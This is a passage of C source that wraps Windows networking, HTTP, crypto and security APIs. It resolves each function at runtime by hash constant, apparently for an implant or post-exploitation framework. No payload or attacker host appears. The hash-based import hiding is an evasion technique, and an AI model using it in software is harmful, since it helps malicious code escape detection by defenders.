    if (pLookupPrivilegeValueW) {
        return pLookupPrivilegeValueW(lpSystemName, lpName, lpLuid);
    }
    return FALSE;
}

BOOL winapi_advapi32_CryptAcquireContextA(HCRYPTPROV* phProv, LPCSTR szContainer, LPCSTR szProvider, DWORD dwProvType, DWORD dwFlags) {
    BOOL (WINAPI *pCryptAcquireContextA)(HCRYPTPROV*, LPCSTR, LPCSTR, DWORD, DWORD) = GetFunctionH(ADVAPI32_DLL, H_CryptAcquireContextA);
    dprintf("[WINAPI][winapi_advapi32_CryptAcquireContextA] Calling CryptAcquireContextA @ %p", pCryptAcquireContextA);
    if (pCryptAcquireContextA) {
        return pCryptAcquireContextA(phProv, szContainer, szProvider, dwProvType, dwFlags);
    }
    return FALSE;
}

BOOL winapi_advapi32_CryptAcquireContextW(HCRYPTPROV* phProv, LPCWSTR szContainer, LPCWSTR szProvider, DWORD dwProvType, DWORD dwFlags) {
    BOOL (WINAPI *pCryptAcquireContextW)(HCRYPTPROV*, LPCWSTR, LPCWSTR, DWORD, DWORD) = GetFunctionH(ADVAPI32_DLL, H_CryptAcquireContextW);
    dprintf("[WINAPI][winapi_advapi32_CryptAcquireContextW] Calling CryptAcquireContextW @ %p", pCryptAcquireContextW);
    if (pCryptAcquireContextW) {
        return pCryptAcquireContextW(phProv, szContainer, szProvider, dwProvType, dwFlags);
    }
    return FALSE;
}

BOOL winapi_advapi32_AddMandatoryAce(PACL pAcl, DWORD dwAceRevision, DWORD AceFlags, DWORD MandatoryPolicy, PSID pLabelSid) {
    BOOL (WINAPI *pAddMandatoryAce)(PACL, DWORD, DWORD, DWORD, PSID) = GetFunctionH(ADVAPI32_DLL, H_AddMandatoryAce);
    dprintf("[WINAPI][winapi_advapi32_AddMandatoryAce] Calling AddMandatoryAce @ %p", pAddMandatoryAce);
    if (pAddMandatoryAce) {
        return pAddMandatoryAce(pAcl, dwAceRevision, AceFlags, MandatoryPolicy, pLabelSid);
    }
    return FALSE;
}

// END: advapi32.dll
// START: crypt32.dll

BOOL winapi_crypt32_CryptDecodeObjectEx(DWORD dwCertEncodingType, LPCSTR lpszStructType, const BYTE* pbEncoded, DWORD cbEncoded, DWORD dwFlags, PCRYPT_DECODE_PARA pDecodePara, void* pvStructInfo, DWORD* pcbStructInfo) {
    BOOL (WINAPI *pCryptDecodeObjectEx)(DWORD dwCertEncodingType, LPCSTR lpszStructType, const BYTE* pbEncoded, DWORD cbEncoded, DWORD dwFlags, PCRYPT_DECODE_PARA pDecodePara, void* pvStructInfo, DWORD* pcbStructInfo) = GetFunctionH(CRYPT32_DLL, H_CryptDecodeObjectEx);
    dprintf("[WINAPI][winapi_crypt32_CryptDecodeObjectEx] Calling CryptDecodeObjectEx @ %p", pCryptDecodeObjectEx);
    if (pCryptDecodeObjectEx) {
        return pCryptDecodeObjectEx(dwCertEncodingType, lpszStructType, pbEncoded, cbEncoded, dwFlags, pDecodePara, pvStructInfo, pcbStructInfo);
    }
    return FALSE;
}

BOOL winapi_crypt32_CryptImportPublicKeyInfo(HCRYPTPROV hCryptProv, DWORD dwCertEncodingType, PCERT_PUBLIC_KEY_INFO pInfo, HCRYPTKEY* phKey) {
    BOOL (WINAPI *pCryptImportPublicKeyInfo)(HCRYPTPROV hCryptProv, DWORD dwCertEncodingType, PCERT_PUBLIC_KEY_INFO pInfo, HCRYPTKEY* phKey) = GetFunctionH(CRYPT32_DLL, H_CryptImportPublicKeyInfo);
    dprintf("[WINAPI][winapi_crypt32_CryptImportPublicKeyInfo] Calling CryptImportPublicKeyInfo @ %p", pCryptImportPublicKeyInfo);
    if (pCryptImportPublicKeyInfo) {
        return pCryptImportPublicKeyInfo(hCryptProv, dwCertEncodingType, pInfo, phKey);
    }
    return FALSE;
}

BOOL winapi_crypt32_CertGetCertificateContextProperty(PCCERT_CONTEXT pCertContext, DWORD dwPropId, void* pvData, DWORD* pcbData) {
    BOOL (WINAPI *pCertGetCertificateContextProperty)(PCCERT_CONTEXT pCertContext, DWORD dwPropId, void* pvData, DWORD* pcbData) = GetFunctionH(CRYPT32_DLL, H_CertGetCertificateContextProperty);
    dprintf("[WINAPI][winapi_crypt32_CertGetCertificateContextProperty] Calling CertGetCertificateContextProperty @ %p", pCertGetCertificateContextProperty);
    if (pCertGetCertificateContextProperty) {
        return pCertGetCertificateContextProperty(pCertContext, dwPropId, pvData, pcbData);
    }
    return FALSE;
}

BOOL winapi_crypt32_CryptBinaryToStringA(const BYTE* pbBinary, DWORD cbBinary, DWORD dwFlags, LPSTR pszString, DWORD* pcchString) {
    BOOL (WINAPI *pCryptBinaryToStringA)(const BYTE*, DWORD, DWORD, LPSTR, DWORD*) = GetFunctionH(CRYPT32_DLL, H_CryptBinaryToStringA);
    dprintf("[WINAPI][winapi_crypt32_CryptBinaryToStringA] Calling CryptBinaryToStringA @ %p", pCryptBinaryToStringA);
    if (pCryptBinaryToStringA) {
        return pCryptBinaryToStringA(pbBinary, cbBinary, dwFlags, pszString, pcchString);
    }
    return FALSE;
}

BOOL winapi_crypt32_CryptStringToBinaryA(LPCSTR pszString, DWORD cchString, DWORD dwFlags, BYTE* pbBinary, DWORD* pcbBinary, DWORD* pdwSkip, DWORD* pdwFlags) {
    BOOL (WINAPI *pCryptStringToBinaryA)(LPCSTR, DWORD, DWORD, BYTE*, DWORD*, DWORD*, DWORD*) = GetFunctionH(CRYPT32_DLL, H_CryptStringToBinaryA);
    dprintf("[WINAPI][winapi_crypt32_CryptStringToBinaryA] Calling CryptStringToBinaryA @ %p", pCryptStringToBinaryA);
    if (pCryptStringToBinaryA) {
        return pCryptStringToBinaryA(pszString, cchString, dwFlags, pbBinary, pcbBinary, pdwSkip, pdwFlags);
    }
    return FALSE;
}

// END: crypt32.dll
// START: user32.dll

BOOL winapi_user32_GetUserObjectInformationA(HANDLE hObj, int nIndex, PVOID pvInfo, DWORD nLength, LPDWORD lpnLengthNeeded) {
    BOOL (WINAPI *pGetUserObjectInformationA)(HANDLE hObj, int nIndex, PVOID pvInfo, DWORD nLength, LPDWORD lpnLengthNeeded) = GetFunctionH(USER32_DLL, H_GetUserObjectInformationA);
    dprintf("[WINAPI][winapi_user32_GetUserObjectInformationA] Calling GetUserObjectInformationA @ %p", pGetUserObjectInformationA);
    if (pGetUserObjectInformationA) {
        return pGetUserObjectInformationA(hObj, nIndex, pvInfo, nLength, lpnLengthNeeded);
    }
    return FALSE;
}

HDESK winapi_user32_GetThreadDesktop(DWORD dwThreadId) {
    HDESK (WINAPI *pGetThreadDesktop)(DWORD dwThreadId) = GetFunctionH(USER32_DLL, H_GetThreadDesktop);
    dprintf("[WINAPI][winapi_user32_GetThreadDesktop] Calling GetThreadDesktop @ %p", pGetThreadDesktop);
    if (pGetThreadDesktop) {
        return pGetThreadDesktop(dwThreadId);
    }
    return NULL;
}

HWINSTA winapi_user32_GetProcessWindowStation(VOID) {
    HWINSTA (WINAPI *pGetProcessWindowStation)(VOID) = GetFunctionH(USER32_DLL, H_GetProcessWindowStation);
    dprintf("[WINAPI][winapi_user32_GetProcessWindowStation] Calling GetProcessWindowStation @ %p", pGetProcessWindowStation);
    if (pGetProcessWindowStation) {
        return pGetProcessWindowStation();
    }
    return NULL;
}

// END: user32.dll
// START: ws2_32.dll
int winapi_ws2_32_WSAStartup(WORD wVersionRequired, LPWSADATA lpWSAData) {
    int (WSAAPI *pWSAStartup)(WORD wVersionRequired, LPWSADATA lpWSAData) = GetFunctionH(WS2_32_DLL, H_WSAStartup);
    dprintf("[WINAPI][winapi_ws2_32_WSAStartup] Calling WSAStartup @ %p", pWSAStartup);
    if (pWSAStartup) {
        return pWSAStartup(wVersionRequired, lpWSAData);
    }
    return WSASYSNOTREADY;
}

SOCKET winapi_ws2_32_socket(int af, int type, int protocol) {
    SOCKET (WSAAPI *psocket)(int af, int type, int protocol) = GetFunctionH(WS2_32_DLL, H_socket);
    dprintf("[WINAPI][winapi_ws2_32_socket] Calling socket @ %p", psocket);
    if (psocket) {
        return psocket(af, type, protocol);
    }
    return INVALID_SOCKET;
}

int winapi_ws2_32_connect(SOCKET s, const struct sockaddr* name, int namelen) {
    int (WSAAPI *pconnect)(SOCKET s, const struct sockaddr* name, int namelen) = GetFunctionH(WS2_32_DLL, H_connect);
    dprintf("[WINAPI][winapi_ws2_32_connect] Calling connect @ %p", pconnect);
    if (pconnect) {
        return pconnect(s, name, namelen);
    }
    return SOCKET_ERROR;
}

SOCKET winapi_ws2_32_accept(SOCKET s, struct sockaddr* addr, int* addrlen) {
    SOCKET (WSAAPI *paccept)(SOCKET s, struct sockaddr* addr, int* addrlen) = GetFunctionH(WS2_32_DLL, H_accept);
    dprintf("[WINAPI][winapi_ws2_32_accept] Calling accept @ %p", paccept);
    if (paccept) {
        return paccept(s, addr, addrlen);
    }
    return INVALID_SOCKET;
}

int winapi_ws2_32_setsockopt(SOCKET s, int level, int optname, const char* optval, int optlen) {
    int (WSAAPI *psetsockopt)(SOCKET s, int level, int optname, const char* optval, int optlen) = GetFunctionH(WS2_32_DLL, H_setsockopt);
    dprintf("[WINAPI][winapi_ws2_32_setsockopt] Calling setsockopt @ %p", psetsockopt);
    if (psetsockopt) {
        return psetsockopt(s, level, optname, optval, optlen);
    }
    return SOCKET_ERROR;
}

int winapi_ws2_32_recv(SOCKET s, char* buf, int len, int flags) {
    int (WSAAPI *precv)(SOCKET s, char* buf, int len, int flags) = GetFunctionH(WS2_32_DLL, H_recv);
    dprintf("[WINAPI][winapi_ws2_32_recv] Calling recv @ %p", precv);
    if (precv) {
        return precv(s, buf, len, flags);
    }
    return SOCKET_ERROR;
}

int winapi_ws2_32_WSADuplicateSocketA(SOCKET s, DWORD dwProcessId, LPWSAPROTOCOL_INFOA lpProtocolInfo) {
    int (WSAAPI *pWSADuplicateSocketA)(SOCKET s, DWORD dwProcessId, LPWSAPROTOCOL_INFOA lpProtocolInfo) = GetFunctionH(WS2_32_DLL, H_WSADuplicateSocketA);
    dprintf("[WINAPI][winapi_ws2_32_WSADuplicateSocketA] Calling WSADuplicateSocketA @ %p", pWSADuplicateSocketA);
    if (pWSADuplicateSocketA) {
        return pWSADuplicateSocketA(s, dwProcessId, lpProtocolInfo);
    }
    return SOCKET_ERROR;
}

int winapi_ws2_32_send(SOCKET s, const char* buf, int len, int flags) {
    int (WSAAPI *pSend)(SOCKET, const char*, int, int) = GetFunctionH(WS2_32_DLL, H_send);
    dprintf("[WINAPI][winapi_ws2_32_send] Calling send @ %p", pSend);
    if (pSend) {
        return pSend(s, buf, len, flags);
    }
    return SOCKET_ERROR;
}

int winapi_ws2_32_bind(SOCKET s, const struct sockaddr* name, int namelen) {
    int (WSAAPI *pBind)(SOCKET, const struct sockaddr*, int) = GetFunctionH(WS2_32_DLL, H_bind);
    dprintf("[WINAPI][winapi_ws2_32_bind] Calling bind @ %p", pBind);
    if (pBind) {
        return pBind(s, name, namelen);
    }
    return SOCKET_ERROR;
}

int winapi_ws2_32_listen(SOCKET s, int backlog) {
    int (WSAAPI *pListen)(SOCKET, int) = GetFunctionH(WS2_32_DLL, H_listen);
    dprintf("[WINAPI][winapi_ws2_32_listen] Calling listen @ %p", pListen);
    if (pListen) {
        return pListen(s, backlog);
    }
    return SOCKET_ERROR;
}

int winapi_ws2_32_closesocket(SOCKET s) {
    int (WSAAPI *pClosesocket)(SOCKET) = GetFunctionH(WS2_32_DLL, H_closesocket);
    dprintf("[WINAPI][winapi_ws2_32_closesocket] Calling closesocket @ %p", pClosesocket);
    if (pClosesocket) {
        return pClosesocket(s);
    }
    return SOCKET_ERROR;
}

int winapi_ws2_32_select(int nfds, fd_set* readfds, fd_set* writefds, fd_set* exceptfds, const struct timeval* timeout) {
    int (WSAAPI *pSelect)(int, fd_set*, fd_set*, fd_set*, const struct timeval*) = GetFunctionH(WS2_32_DLL, H_select);
    dprintf("[WINAPI][winapi_ws2_32_select] Calling select @ %p", pSelect);
    if (pSelect) {
        return pSelect(nfds, readfds, writefds, exceptfds, timeout);
    }
    return SOCKET_ERROR;
}

struct hostent* winapi_ws2_32_gethostbyname(const char* name) {
    struct hostent* (WSAAPI *pGethostbyname)(const char*) = GetFunctionH(WS2_32_DLL, H_gethostbyname);
    dprintf("[WINAPI][winapi_ws2_32_gethostbyname] Calling gethostbyname @ %p", pGethostbyname);
    if (pGethostbyname) {
        return pGethostbyname(name);
    }
    return NULL;
}

int winapi_ws2_32_getaddrinfo(PCSTR pNodeName, PCSTR pServiceName, const ADDRINFOA* pHints, PADDRINFOA* ppResult) {
    int (WSAAPI *pGetaddrinfo)(PCSTR, PCSTR, const ADDRINFOA*, PADDRINFOA*) = GetFunctionH(WS2_32_DLL, H_getaddrinfo);
    dprintf("[WINAPI][winapi_ws2_32_getaddrinfo] Calling getaddrinfo @ %p", pGetaddrinfo);
    if (pGetaddrinfo) {
        return pGetaddrinfo(pNodeName, pServiceName, pHints, ppResult);
    }
    return WSAEINVAL;
}

VOID winapi_ws2_32_freeaddrinfo(PADDRINFOA pAddrInfo) {
    VOID (WSAAPI *pFreeaddrinfo)(PADDRINFOA) = GetFunctionH(WS2_32_DLL, H_freeaddrinfo);
    dprintf("[WINAPI][winapi_ws2_32_freeaddrinfo] Calling freeaddrinfo @ %p", pFreeaddrinfo);
    if (pFreeaddrinfo) {
        pFreeaddrinfo(pAddrInfo);
    }
}

u_short winapi_ws2_32_htons(u_short hostshort) {
    u_short (WSAAPI *pHtons)(u_short) = GetFunctionH(WS2_32_DLL, H_htons);
    dprintf("[WINAPI][winapi_ws2_32_htons] Calling htons @ %p", pHtons);
    if (pHtons) {
        return pHtons(hostshort);
    }
    return 0;
}

u_long winapi_ws2_32_htonl(u_long hostlong) {
    u_long (WSAAPI *pHtonl)(u_long) = GetFunctionH(WS2_32_DLL, H_htonl);
    dprintf("[WINAPI][winapi_ws2_32_htonl] Calling htonl @ %p", pHtonl);
    if (pHtonl) {
        return pHtonl(hostlong);
    }
    return 0;
}

u_long winapi_ws2_32_ntohl(u_long netlong) {
    u_long (WSAAPI *pNtohl)(u_long) = GetFunctionH(WS2_32_DLL, H_ntohl);
    dprintf("[WINAPI][winapi_ws2_32_ntohl] Calling ntohl @ %p", pNtohl);
    if (pNtohl) {
        return pNtohl(netlong);
    }
    return 0;
}

unsigned long winapi_ws2_32_inet_addr(const char* cp) {
    unsigned long (WSAAPI *pInet_addr)(const char*) = GetFunctionH(WS2_32_DLL, H_inet_addr);
    dprintf("[WINAPI][winapi_ws2_32_inet_addr] Calling inet_addr @ %p", pInet_addr);
    if (pInet_addr) {
        return pInet_addr(cp);
    }
    return INADDR_NONE;
}

// END: ws2_32.dll
// START: ws2_32 extensions.dll

int winapi_ws2_32_WSAGetLastError(VOID) {
    int (WSAAPI *pWSAGetLastError)(VOID) = GetFunctionH(WS2_32_DLL, H_WSAGetLastError);
    dprintf("[WINAPI][winapi_ws2_32_WSAGetLastError] Calling WSAGetLastError @ %p", pWSAGetLastError);
    if (pWSAGetLastError) {
        return pWSAGetLastError();
    }
    return 0;
}

char* winapi_ws2_32_inet_ntoa(struct in_addr in) {
    char* (WSAAPI *pInet_ntoa)(struct in_addr) = GetFunctionH(WS2_32_DLL, H_inet_ntoa);
    dprintf("[WINAPI][winapi_ws2_32_inet_ntoa] Calling inet_ntoa @ %p", pInet_ntoa);
    if (pInet_ntoa) {
        return pInet_ntoa(in);
    }
    return NULL;
}

// END: ws2_32 extensions.dll
// START: wininet.dll

HINTERNET winapi_wininet_InternetOpenW(LPCWSTR lpszAgent, DWORD dwAccessType, LPCWSTR lpszProxy, LPCWSTR lpszProxyBypass, DWORD dwFlags) {
    HINTERNET (WINAPI *pInternetOpenW)(LPCWSTR lpszAgent, DWORD dwAccessType, LPCWSTR lpszProxy, LPCWSTR lpszProxyBypass, DWORD dwFlags) = GetFunctionH(WININET_DLL, H_InternetOpenW);
    dprintf("[WINAPI][winapi_wininet_InternetOpenW] Calling InternetOpenW @ %p", pInternetOpenW);
    if (pInternetOpenW) {
        return pInternetOpenW(lpszAgent, dwAccessType, lpszProxy, lpszProxyBypass, dwFlags);
    }
    return NULL;
}

HINTERNET winapi_wininet_InternetConnectW(HINTERNET hInternet, LPCWSTR lpszServerName, INTERNET_PORT nServerPort, LPCWSTR lpszUserName, LPCWSTR lpszPassword, DWORD dwService, DWORD dwFlags, DWORD_PTR dwContext) {
    HINTERNET (WINAPI *pInternetConnectW)(HINTERNET hInternet, LPCWSTR lpszServerName, INTERNET_PORT nServerPort, LPCWSTR lpszUserName, LPCWSTR lpszPassword, DWORD dwService, DWORD dwFlags, DWORD_PTR dwContext) = GetFunctionH(WININET_DLL, H_InternetConnectW);
    dprintf("[WINAPI][winapi_wininet_InternetConnectW] Calling InternetConnectW @ %p", pInternetConnectW);
    if (pInternetConnectW) {
        return pInternetConnectW(hInternet, lpszServerName, nServerPort, lpszUserName, lpszPassword, dwService, dwFlags, dwContext);
    }
    return NULL;
}

HINTERNET winapi_wininet_HttpOpenRequestW(HINTERNET hConnect, LPCWSTR lpszVerb, LPCWSTR lpszObjectName, LPCWSTR lpszVersion, LPCWSTR lpszReferrer, LPCWSTR* lplpszAcceptTypes, DWORD dwFlags, DWORD_PTR dwContext) {
    HINTERNET (WINAPI *pHttpOpenRequestW)(HINTERNET hConnect, LPCWSTR lpszVerb, LPCWSTR lpszObjectName, LPCWSTR lpszVersion, LPCWSTR lpszReferrer, LPCWSTR* lplpszAcceptTypes, DWORD dwFlags, DWORD_PTR dwContext) = GetFunctionH(WININET_DLL, H_HttpOpenRequestW);
    dprintf("[WINAPI][winapi_wininet_HttpOpenRequestW] Calling HttpOpenRequestW @ %p", pHttpOpenRequestW);
    if (pHttpOpenRequestW) {
        return pHttpOpenRequestW(hConnect, lpszVerb, lpszObjectName, lpszVersion, lpszReferrer, lplpszAcceptTypes, dwFlags, dwContext);
    }
    return NULL;
}

BOOL winapi_wininet_InternetSetOptionW(HINTERNET hInternet, DWORD dwOption, LPVOID lpBuffer, DWORD dwBufferLength) {
    BOOL (WINAPI *pInternetSetOptionW)(HINTERNET hInternet, DWORD dwOption, LPVOID lpBuffer, DWORD dwBufferLength) = GetFunctionH(WININET_DLL, H_InternetSetOptionW);
    dprintf("[WINAPI][winapi_wininet_InternetSetOptionW] Calling InternetSetOptionW @ %p", pInternetSetOptionW);
    if (pInternetSetOptionW) {
        return pInternetSetOptionW(hInternet, dwOption, lpBuffer, dwBufferLength);
    }
    return FALSE;
}

BOOL winapi_wininet_HttpSendRequestW(HINTERNET hRequest, LPCWSTR lpszHeaders, DWORD dwHeadersLength, LPVOID lpOptional, DWORD dwOptionalLength) {
    BOOL (WINAPI *pHttpSendRequestW)(HINTERNET hRequest, LPCWSTR lpszHeaders, DWORD dwHeadersLength, LPVOID lpOptional, DWORD dwOptionalLength) = GetFunctionH(WININET_DLL, H_HttpSendRequestW);
    dprintf("[WINAPI][winapi_wininet_HttpSendRequestW] Calling HttpSendRequestW @ %p", pHttpSendRequestW);
    if (pHttpSendRequestW) {
        return pHttpSendRequestW(hRequest, lpszHeaders, dwHeadersLength, lpOptional, dwOptionalLength);
    }
    return FALSE;
}

BOOL winapi_wininet_HttpQueryInfoW(HINTERNET hRequest, DWORD dwInfoLevel, LPVOID lpBuffer, LPDWORD lpdwBufferLength, LPDWORD lpdwIndex) {
    BOOL (WINAPI *pHttpQueryInfoW)(HINTERNET hRequest, DWORD dwInfoLevel, LPVOID lpBuffer, LPDWORD lpdwBufferLength, LPDWORD lpdwIndex) = GetFunctionH(WININET_DLL, H_HttpQueryInfoW);
    dprintf("[WINAPI][winapi_wininet_HttpQueryInfoW] Calling HttpQueryInfoW @ %p", pHttpQueryInfoW);
    if (pHttpQueryInfoW) {
        return pHttpQueryInfoW(hRequest, dwInfoLevel, lpBuffer, lpdwBufferLength, lpdwIndex);
    }
    return FALSE;
}

BOOL winapi_wininet_InternetReadFile(HINTERNET hFile, LPVOID lpBuffer, DWORD dwNumberOfBytesToRead, LPDWORD lpdwNumberOfBytesRead) {
    BOOL (WINAPI *pInternetReadFile)(HINTERNET hFile, LPVOID lpBuffer, DWORD dwNumberOfBytesToRead, LPDWORD lpdwNumberOfBytesRead) = GetFunctionH(WININET_DLL, H_InternetReadFile);
    dprintf("[WINAPI][winapi_wininet_InternetReadFile] Calling InternetReadFile @ %p", pInternetReadFile);
    if (pInternetReadFile) {
        return pInternetReadFile(hFile, lpBuffer, dwNumberOfBytesToRead, lpdwNumberOfBytesRead);
    }
    return FALSE;
}

BOOL winapi_wininet_InternetCloseHandle(HINTERNET hInternet) {
    BOOL (WINAPI *pInternetCloseHandle)(HINTERNET hInternet) = GetFunctionH(WININET_DLL, H_InternetCloseHandle);
    dprintf("[WINAPI][winapi_wininet_InternetCloseHandle] Calling InternetCloseHandle @ %p", pInternetCloseHandle);
    if (pInternetCloseHandle) {
        return pInternetCloseHandle(hInternet);
    }
    return FALSE;
}

BOOL winapi_wininet_InternetCrackUrlW(LPCWSTR lpszUrl, DWORD dwUrlLength, DWORD dwFlags, LPURL_COMPONENTSW lpUrlComponents) {
    BOOL (WINAPI *pInternetCrackUrlW)(LPCWSTR lpszUrl, DWORD dwUrlLength, DWORD dwFlags, LPURL_COMPONENTSW lpUrlComponents) = GetFunctionH(WININET_DLL, H_InternetCrackUrlW);
    dprintf("[WINAPI][winapi_wininet_InternetCrackUrlW] Calling InternetCrackUrlW @ %p", pInternetCrackUrlW);
    if (pInternetCrackUrlW) {
        return pInternetCrackUrlW(lpszUrl, dwUrlLength, dwFlags, lpUrlComponents);
    }
    return FALSE;
}

// END: wininet.dll
// START: wininet extensions.dll

BOOL winapi_wininet_HttpQueryInfoA(HINTERNET hRequest, DWORD dwInfoLevel, LPVOID lpBuffer, LPDWORD lpdwBufferLength, LPDWORD lpdwIndex) {
    BOOL (WINAPI *pHttpQueryInfoA)(HINTERNET, DWORD, LPVOID, LPDWORD, LPDWORD) = GetFunctionH(WININET_DLL, H_HttpQueryInfoA);
    dprintf("[WINAPI][winapi_wininet_HttpQueryInfoA] Calling HttpQueryInfoA @ %p", pHttpQueryInfoA);
    if (pHttpQueryInfoA) {
        return pHttpQueryInfoA(hRequest, dwInfoLevel, lpBuffer, lpdwBufferLength, lpdwIndex);
    }
    return FALSE;
}

// END: wininet extensions.dll
// START: rpcrt4.dll

RPC_STATUS winapi_rpcrt4_UuidCreate(UUID* Uuid) {
    RPC_STATUS (RPC_ENTRY *pUuidCreate)(UUID* Uuid) = GetFunctionH(RPCRT4_DLL, H_UuidCreate);
    dprintf("[WINAPI][winapi_rpcrt4_UuidCreate] Calling UuidCreate @ %p", pUuidCreate);
    if (pUuidCreate) {
        return pUuidCreate(Uuid);
    }
    return RPC_S_INTERNAL_ERROR;
}

// END: rpcrt4.dll
// START: winhttp.dll

HINTERNET winapi_winhttp_WinHttpOpen(LPCWSTR pszAgentW, DWORD dwAccessType, LPCWSTR pszProxyW, LPCWSTR pszProxyBypassW, DWORD dwFlags) {
    HINTERNET (WINAPI *pWinHttpOpen)(LPCWSTR pszAgentW, DWORD dwAccessType, LPCWSTR pszProxyW, LPCWSTR pszProxyBypassW, DWORD dwFlags) = GetFunctionH(WINHTTP_DLL, H_WinHttpOpen);
    dprintf("[WINAPI][winapi_winhttp_WinHttpOpen] Calling WinHttpOpen @ %p", pWinHttpOpen);
    if (pWinHttpOpen) {
        return pWinHttpOpen(pszAgentW, dwAccessType, pszProxyW, pszProxyBypassW, dwFlags);
    }
    return NULL;
}

HINTERNET winapi_winhttp_WinHttpConnect(HINTERNET hSession, LPCWSTR pswzServerName, INTERNET_PORT nServerPort, DWORD dwReserved) {
    HINTERNET (WINAPI *pWinHttpConnect)(HINTERNET hSession, LPCWSTR pswzServerName, INTERNET_PORT nServerPort, DWORD dwReserved) = GetFunctionH(WINHTTP_DLL, H_WinHttpConnect);
    dprintf("[WINAPI][winapi_winhttp_WinHttpConnect] Calling WinHttpConnect @ %p", pWinHttpConnect);
    if (pWinHttpConnect) {
        return pWinHttpConnect(hSession, pswzServerName, nServerPort, dwReserved);
    }
    return NULL;
}

HINTERNET winapi_winhttp_WinHttpOpenRequest(HINTERNET hConnect, LPCWSTR pwszVerb, LPCWSTR pwszObjectName, LPCWSTR pwszVersion, LPCWSTR pwszReferrer, LPCWSTR* ppwszAcceptTypes, DWORD dwFlags) {
    HINTERNET (WINAPI *pWinHttpOpenRequest)(HINTERNET hConnect, LPCWSTR pwszVerb, LPCWSTR pwszObjectName, LPCWSTR pwszVersion, LPCWSTR pwszReferrer, LPCWSTR* ppwszAcceptTypes, DWORD dwFlags) = GetFunctionH(WINHTTP_DLL, H_WinHttpOpenRequest);
    dprintf("[WINAPI][winapi_winhttp_WinHttpOpenRequest] Calling WinHttpOpenRequest @ %p", pWinHttpOpenRequest);
    if (pWinHttpOpenRequest) {
        return pWinHttpOpenRequest(hConnect, pwszVerb, pwszObjectName, pwszVersion, pwszReferrer, ppwszAcceptTypes, dwFlags);
    }
    return NULL;
}

BOOL winapi_winhttp_WinHttpGetIEProxyConfigForCurrentUser(WINHTTP_CURRENT_USER_IE_PROXY_CONFIG* pProxyConfig) {
    BOOL (WINAPI *pWinHttpGetIEProxyConfigForCurrentUser)(WINHTTP_CURRENT_USER_IE_PROXY_CONFIG* pProxyConfig) = GetFunctionH(WINHTTP_DLL, H_WinHttpGetIEProxyConfigForCurrentUser);
    dprintf("[WINAPI][winapi_winhttp_WinHttpGetIEProxyConfigForCurrentUser] Calling WinHttpGetIEProxyConfigForCurrentUser @ %p", pWinHttpGetIEProxyConfigForCurrentUser);
    if (pWinHttpGetIEProxyConfigForCurrentUser) {
        return pWinHttpGetIEProxyConfigForCurrentUser(pProxyConfig);
    }
    return FALSE;
}

BOOL winapi_winhttp_WinHttpGetProxyForUrl(HINTERNET hSession, LPCWSTR lpcwszUrl, WINHTTP_AUTOPROXY_OPTIONS* pAutoProxyOptions, WINHTTP_PROXY_INFO* pProxyInfo) {
    BOOL (WINAPI *pWinHttpGetProxyForUrl)(HINTERNET hSession, LPCWSTR lpcwszUrl, WINHTTP_AUTOPROXY_OPTIONS* pAutoProxyOptions, WINHTTP_PROXY_INFO* pProxyInfo) = GetFunctionH(WINHTTP_DLL, H_WinHttpGetProxyForUrl);
    dprintf("[WINAPI][winapi_winhttp_WinHttpGetProxyForUrl] Calling WinHttpGetProxyForUrl @ %p", pWinHttpGetProxyForUrl);
    if (pWinHttpGetProxyForUrl) {
        return pWinHttpGetProxyForUrl(hSession, lpcwszUrl, pAutoProxyOptions, pProxyInfo);
    }
    return FALSE;
}

BOOL winapi_winhttp_WinHttpSetOption(HINTERNET hInternet, DWORD dwOption, LPVOID lpBuffer, DWORD dwBufferLength) {
    BOOL (WINAPI *pWinHttpSetOption)(HINTERNET hInternet, DWORD dwOption, LPVOID lpBuffer, DWORD dwBufferLength) = GetFunctionH(WINHTTP_DLL, H_WinHttpSetOption);
    dprintf("[WINAPI][winapi_winhttp_WinHttpSetOption] Calling WinHttpSetOption @ %p", pWinHttpSetOption);
    if (pWinHttpSetOption) {
        return pWinHttpSetOption(hInternet, dwOption, lpBuffer, dwBufferLength);
    }
    return FALSE;
}

BOOL winapi_winhttp_WinHttpSendRequest(HINTERNET hRequest, LPCWSTR lpszHeaders, DWORD dwHeadersLength, LPVOID lpOptional, DWORD dwOptionalLength, DWORD dwTotalLength, DWORD_PTR dwContext) {
    BOOL (WINAPI *pWinHttpSendRequest)(HINTERNET hRequest, LPCWSTR lpszHeaders, DWORD dwHeadersLength, LPVOID lpOptional, DWORD dwOptionalLength, DWORD dwTotalLength, DWORD_PTR dwContext) = GetFunctionH(WINHTTP_DLL, H_WinHttpSendRequest);
    dprintf("[WINAPI][winapi_winhttp_WinHttpSendRequest] Calling WinHttpSendRequest @ %p", pWinHttpSendRequest);
    if (pWinHttpSendRequest) {
        return pWinHttpSendRequest(hRequest, lpszHeaders, dwHeadersLength, lpOptional, dwOptionalLength, dwTotalLength, dwContext);
    }
    return FALSE;
}

BOOL winapi_winhttp_WinHttpReceiveResponse(HINTERNET hRequest, LPVOID lpReserved) {
    BOOL (WINAPI *pWinHttpReceiveResponse)(HINTERNET hRequest, LPVOID lpReserved) = GetFunctionH(WINHTTP_DLL, H_WinHttpReceiveResponse);
    dprintf("[WINAPI][winapi_winhttp_WinHttpReceiveResponse] Calling WinHttpReceiveResponse @ %p", pWinHttpReceiveResponse);
    if (pWinHttpReceiveResponse) {
        return pWinHttpReceiveResponse(hRequest, lpReserved);
    }
    return FALSE;
}

BOOL winapi_winhttp_WinHttpQueryHeaders(HINTERNET hRequest, DWORD dwInfoLevel, LPCWSTR pwszName, LPVOID lpvBuffer, LPDWORD lpdwBufferLength, LPDWORD lpdwIndex) {
    BOOL (WINAPI *pWinHttpQueryHeaders)(HINTERNET hRequest, DWORD dwInfoLevel, LPCWSTR pwszName, LPVOID lpvBuffer, LPDWORD lpdwBufferLength, LPDWORD lpdwIndex) = GetFunctionH(WINHTTP_DLL, H_WinHttpQueryHeaders);
    dprintf("[WINAPI][winapi_winhttp_WinHttpQueryHeaders] Calling WinHttpQueryHeaders @ %p", pWinHttpQueryHeaders);
    if (pWinHttpQueryHeaders) {
        return pWinHttpQueryHeaders(hRequest, dwInfoLevel, pwszName, lpvBuffer, lpdwBufferLength, lpdwIndex);
    }
    return FALSE;
}

BOOL winapi_winhttp_WinHttpReadData(HINTERNET hRequest, LPVOID lpBuffer, DWORD dwNumberOfBytesToRead, LPDWORD lpdwNumberOfBytesRead) {
    BOOL (WINAPI *pWinHttpReadData)(HINTERNET hRequest, LPVOID lpBuffer, DWORD dwNumberOfBytesToRead, LPDWORD lpdwNumberOfBytesRead) = GetFunctionH(WINHTTP_DLL, H_WinHttpReadData);
